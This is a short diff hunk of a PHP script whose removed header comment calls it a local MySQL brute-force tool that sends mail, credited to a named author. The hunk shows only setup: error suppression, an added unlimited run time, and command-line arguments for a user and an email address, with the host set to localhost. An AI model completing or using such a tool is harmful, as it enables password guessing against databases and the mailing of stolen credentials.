@@ -1,7 +1,7 @@
 <?php
-// Local Mysql Brute Force With Send Mail
 // Coded By Afrizal F.A - ICWR-TECH
 error_reporting(0);
+set_time_limit(0);
 $user=$argv[1];
 $mail=$argv[2];
 $host="localhost";
